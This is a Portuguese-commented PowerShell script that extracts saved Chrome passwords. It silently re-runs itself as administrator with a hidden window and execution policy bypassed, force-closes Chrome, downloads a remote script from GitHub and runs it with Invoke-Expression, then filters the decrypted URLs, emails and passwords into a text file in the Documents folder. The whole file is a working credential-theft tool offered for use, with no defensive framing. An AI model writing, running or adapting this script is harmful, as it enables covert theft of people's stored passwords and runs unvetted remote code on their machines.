# ExtrairSenhas.ps1 - Versão CORRIGIDA para Chrome atual

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Limpa o arquivo anterior se existir
if (Test-Path $arquivoSaida) { Remove-Item $arquivoSaida -Force }

# Força o Chrome a liberar o banco de dados
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Tenta o script original com tratamento de erro
try {
    $script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -ErrorAction Stop
    Invoke-Expression $script
    
    # Executa e captura a saída
    $output = Invoke-PowerChrome -Browser Chrome 2>&1
    
    # Filtra apenas linhas que contêm dados reais
    $linhasFiltradas = $output | Where-Object {
        $_ -match "https?://" -or 
        $_ -match "@" -or 
        ($_ -match "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" -and $_ -notmatch "Github|BCryptDecrypt|failed")
    }
    
    if ($linhasFiltradas.Count -gt 0) {
        $linhasFiltradas | Out-File -FilePath $arquivoSaida -Encoding UTF8
        Write-Host "SUCESSO! Senhas salvas em: $arquivoSaida" -ForegroundColor Green
    } else {
        "Nenhuma senha encontrada ou erro na descriptografia." | Out-File -FilePath $arquivoSaida -Encoding UTF8
        Write-Host "Nenhuma senha encontrada." -ForegroundColor Yellow
    }
}
catch {
    "ERRO: $($_.Exception.Message)" | Out-File -FilePath $arquivoSaida -Encoding UTF8
    Write-Host "Erro ao executar: $_" -ForegroundColor Red
}

# Pequena pausa para garantir que o arquivo foi escrito
Start-Sleep -Seconds 1
exit
